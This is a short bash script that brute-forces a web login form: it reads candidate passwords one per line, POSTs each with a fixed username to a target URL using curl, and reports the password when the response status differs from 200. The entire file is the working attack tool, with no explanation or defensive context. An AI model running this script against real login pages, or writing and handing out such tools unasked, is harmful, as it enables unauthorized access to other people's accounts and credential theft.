#!/bin/bash

while IFS= read -r PASSWORD || [[ -n "$PASSWORD" ]]; do

    POST_DATA="username=$ACCOUNT_ID&password=$PASSWORD"
    
    RESULT=$(curl -s -L -X POST -d "$POST_DATA" -w "%{http_code}:%{size_download}\n" -o /dev/null "$TARGET_URL")
    STATUS_CODE=$(echo $RESULT | cut -d: -f1)
    LENGTH=$(echo $RESULT | cut -d: -f2)

    if [ "$STATUS_CODE" -ne 200 ]; then
        echo "------------------------------------------------------"
        echo "SUCCESS FOUND!"
        echo "  - Password: $PASSWORD"
        echo "  - Status: $STATUS_CODE"
        echo "  - Length: $LENGTH"
        echo "------------------------------------------------------"
        exit 0
    fi
    
done

echo "Brute-force finished. Password not found."


